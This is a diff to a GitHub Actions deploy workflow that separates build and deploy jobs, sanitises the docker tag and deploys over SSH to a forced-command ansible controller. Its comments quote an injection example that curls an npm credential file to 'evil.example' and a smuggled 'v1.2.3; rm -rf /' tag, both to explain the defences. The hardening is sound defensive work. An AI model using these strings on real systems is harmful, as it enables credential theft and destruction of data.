@@ -1,5 +1,14 @@
 name: "Host: Build and deploy branch to environment"
 
+#
+# The deploy runs as a separate job declaring `environment: deploy`, which is the
+# only reason the ansible controller key is absent while the build runs npm installs,
+# seven frontend app builds and several third-party actions. The environment has
+# no branch policy and no reviewers: it exists for that job split and nothing
+# else. See the DevOps repo:
+# docs/superpowers/specs/2026-08-10-github-deploy-button-design.md
+#
+
 on:
   workflow_dispatch:
     inputs:
@@ -18,11 +27,6 @@ on:
         description: "chat-kmp branch/commit to include"
         required: true
         default: "main"
-      include_chat_wasm:
-        type: boolean
-        required: false
-        default: false
-        description: "Include chat-wasm in the build"
       start_choice:
         type: choice
         required: true
@@ -36,8 +40,15 @@ env:
   IMAGE_NAME: ${{ github.repository }}-internal
 
 jobs:
-  build_and_deploy:
+  build:
     runs-on: ubuntu-latest
+
+    permissions:
+      contents: read
+      packages: write
+
+    outputs:
+      image_tag: ${{ steps.image.outputs.image_tag }}
 
     steps:
       - name: Log all workflow inputs and current branch
@@ -48,10 +59,10 @@ jobs:
           echo "Workflow inputs as JSON: $INPUTS"
         env:
           INPUTS: ${{ toJson(github.event.inputs) }}
-          GITHUB_REF: ${{ github.ref }}    
+          GITHUB_REF: ${{ github.ref }}
 
       - name: Checkout Repository
-        uses: actions/checkout@v4 
+        uses: actions/checkout@v4
         with:
           path: odin-core
 
@@ -71,8 +82,6 @@ jobs:
       #
 
       - name: Build chat-wasm
-        if: ${{ inputs.include_chat_wasm }}
-        continue-on-error: true
         uses: ./odin-core/.github/actions/host/build-kotlin-wasm
         with:
           odin_lib_token: ${{ secrets.DOTYOUCORE_LIB_TOKEN }}
@@ -98,10 +107,28 @@ jobs:
         with:
           images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
 
-      - name: Combine Docker tags
+      - name: Derive the image tag
+        id: image
+        env:
+          # Read back as shell variables, never interpolated into the script
+          # text. GitHub substitutes ${{ }} before bash parses the line, so an
+          # fe_ref of `$(curl evil.example -d @$HOME/.npmrc)` would execute in
+          # this job, which holds DOTYOUCORE_LIB_TOKEN.
+          REF_NAME: ${{ github.ref_name }}
+          FE_REF: ${{ github.event.inputs.fe_ref }}
         run: |
-          lowercase_image_tags=$(echo "${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.ref_name }}__${{ github.event.inputs.fe_ref }}" | tr '[:upper:]' '[:lower:]')
-          echo "IMAGE_WITH_TAG=$lowercase_image_tags" >> $GITHUB_ENV
+          # Sanitised to the docker tag character set, which is also the tag
+          # allowlist run-playbook.sh enforces on the ansible controller:
+          # ^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$. fe_ref is free text, so an
+          # unsanitised value carrying a slash produced an invalid reference and
+          # failed at push time.
+          tag="$(printf '%s' "${REF_NAME}__${FE_REF}" | tr '[:upper:]' '[:lower:]' | tr -c 'a-z0-9._-' '-')"
+          tag="${tag:0:128}"
+          [[ "$tag" =~ ^[a-z0-9] ]] || tag="x${tag:0:127}"
+          image="$(printf '%s' "${REGISTRY}/${IMAGE_NAME}" | tr '[:upper:]' '[:lower:]')"
+          echo "image_tag=${tag}" >>"$GITHUB_OUTPUT"
+          echo "image_ref=${image}:${tag}" >>"$GITHUB_OUTPUT"
+          echo "Building and deploying tag: ${tag}"
 
       - name: Build and push Docker image
         uses: docker/build-push-action@v5.3.0
@@ -109,25 +136,107 @@ jobs:
           context: ./odin-core
           file: ./odin-core/docker/Dockerfile-identity-host
           push: true
-          tags: ${{ env.IMAGE_WITH_TAG }}
+          tags: ${{ steps.image.outputs.image_ref }}
           labels: ${{ steps.meta.outputs.labels }}
           platforms: linux/amd64,linux/arm64
           provenance: false
           outputs: type=image,name=target,annotation-index.org.opencontainers.image.description=homebase.id
 
+  #
+  # Deploy docker image
+  #
+  deploy:
+    needs: build
+    runs-on: ubuntu-latest
+
+    # Environment secrets reach only the job that declares the environment.
+    # That is the whole reason this is a second job.
+    environment: deploy
+
+    # The deploy job needs no GITHUB_TOKEN at all.
+    permissions: {}
+
+    steps:
+      # Deliberately written inline and repeated across the deploy workflows
+      # rather than factored into a composite action. The action this replaced
+      # took the ansible SSH key as an input, and a composite action taking a
+      # key as an input is the shape being removed: it moves the privileged step
+      # out of the file under review. Repeating a dozen lines is the cheaper
+      # half of that trade.
       #
-      # Deploy docker image
+      # Every ${{ }} goes through env: and is read back as a shell variable.
+      # GitHub substitutes expressions into the script text before bash parses
+      # it, so an inline tag carrying shell metacharacters would execute inside
+      # the job that holds the deploy key. Do not simplify this.
       #
-
-      - name: Deploy Docker Image    
-        uses: ./odin-core/.github/actions/host/deploy-image-to-environment
-        with:
-          image_name: ${{ env.IMAGE_WITH_TAG }}
-          env_name: ${{ github.event.inputs.env_choice }}
-          force_update: 'true'
-          start_container: ${{ github.event.inputs.start_choice }}
-          ansible_host: ${{ secrets.ANSIBLE_HOST }}
-          ansible_username: ${{ secrets.ANSIBLE_USERNAME }}
-          ansible_ssh_key: ${{ secrets.ANSIBLE_SSH_KEY }}
-
-
+      # The ansible controller validates every field again, independently, in two scripts
+      # running as two different users. It constructs the image reference itself
+      # from REPOSITORY and TAG and will not accept one.
+      #
+      # ABOUT THE `deploy ...` STRING ON THE LAST LINE. It is not a script, a
+      # binary, or anything that exists on the ansible controller's PATH. Reading
+      # it as a remote command is the natural mistake and it is worth a paragraph.
+      #
+      # The key's line in ~deploy/.ssh/authorized_keys on the ansible controller is
+      #
+      #     command="/usr/local/bin/odin-deploy.sh",restrict ssh-ed25519 AAAA...
+      #
+      # and `command=` makes sshd DISCARD whatever command was requested, run
+      # odin-deploy.sh instead, and hand the requested string over untouched in the
+      # environment variable SSH_ORIGINAL_COMMAND. So no shell on the far side ever
+      # parses the line below: odin-deploy.sh splits and validates it itself.
+      #
+      # That is why shell metacharacters in it cannot inject. Send a tag of
+      # `v1.2.3; rm -rf /` and nothing runs and no shell refuses it: the semicolon
+      # simply lands inside the tag field, which becomes `v1.2.3;` and fails the tag
+      # pattern at odin-deploy.sh:85. The trailing `rm`, `-rf` and `/` become three
+      # extra tokens that would each fail the parameter pattern too, but validation
+      # never gets that far. Verified against the live host, 2026-08-11.
+      #
+      # The string is a five-field protocol of our own invention:
+      #
+      #     deploy <service> <env> <repository> <tag> [key=value ...]
+      #
+      #     deploy       a literal verb, compared against the string "deploy".
+      #                  There is exactly one and no dispatch behind it; it exists
+      #                  so a malformed string fails an explicit check with its own
+      #                  syslog line instead of being reinterpreted.
+      #     service      odin-core. The only routable service.
+      #     env          bleeding_edge | sandbox | production
+      #     repository   odin-core | odin-core-internal. The REGISTRY is hardcoded
+      #                  on the ansible controller and is deliberately not a field,
+      #                  which is what keeps a stolen key confined to images we
+      #                  published.
+      #     tag          the docker tag character set,
+      #                  ^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$
+      #     key=value    allowlisted parameters, currently only
+      #                  start_container=true|false. Anything starting ansible_ is
+      #                  refused unconditionally.
+      #
+      # Every field is validated twice by two scripts running as two different
+      # users: odin-deploy.sh as the shell-less `deploy` account, then
+      # run-playbook.sh as `ansible`. Both live in the DevOps repo at
+      # ansible/files/controller/, and the design is at
+      # docs/superpowers/specs/2026-08-10-github-deploy-button-design.md
+      - name: Deploy through the ansible controller
+        env:
+          ANSIBLE_CONTROLLER: deploy@167.235.203.161
+          ENV_NAME: ${{ github.event.inputs.env_choice }}
+          REPOSITORY: odin-core-internal
+          TAG: ${{ needs.build.outputs.image_tag }}
+          START_CONTAINER: ${{ github.event.inputs.start_choice }}
+          DEPLOY_KEY: ${{ secrets.CONTROLLER_DEPLOY_KEY }}
+        run: |
+          key="${RUNNER_TEMP}/ansible_controller_deploy_key"
+          trap 'rm -f "$key"' EXIT
+          install -m 600 /dev/null "$key"
+          printf '%s\n' "$DEPLOY_KEY" >"$key"
+          ssh -i "$key" \
+            -o IdentitiesOnly=yes \
+            -o BatchMode=yes \
+            -o StrictHostKeyChecking=accept-new \
+            -o ConnectTimeout=30 \
+            -o ServerAliveInterval=30 \
+            -o ServerAliveCountMax=10 \
+            "$ANSIBLE_CONTROLLER" \
+            "deploy odin-core ${ENV_NAME} ${REPOSITORY} ${TAG} start_container=${START_CONTAINER}"
